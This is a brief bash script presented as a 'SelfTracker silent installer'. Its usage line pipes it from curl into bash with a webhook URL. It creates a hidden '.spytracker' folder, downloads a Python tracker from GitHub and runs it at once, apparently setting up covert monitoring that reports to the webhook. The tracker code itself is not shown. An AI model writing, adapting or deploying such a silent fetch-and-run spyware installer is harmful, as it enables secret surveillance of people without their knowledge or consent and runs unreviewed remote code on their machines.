#!/bin/bash
# SelfTracker silent installer - macOS / Linux v2
# Usage: curl -fsSL <url>/install.sh | bash -s '<webhook-url>'
set -e

DIR="$HOME/.spytracker"
mkdir -p "$DIR"
curl -fsSL "https://raw.githubusercontent.com/inf-nicolasperez/self-tracker/main/tracker.py" -o "$DIR/tracker.py"
exec python3 "$DIR/tracker.py" --install "$1"
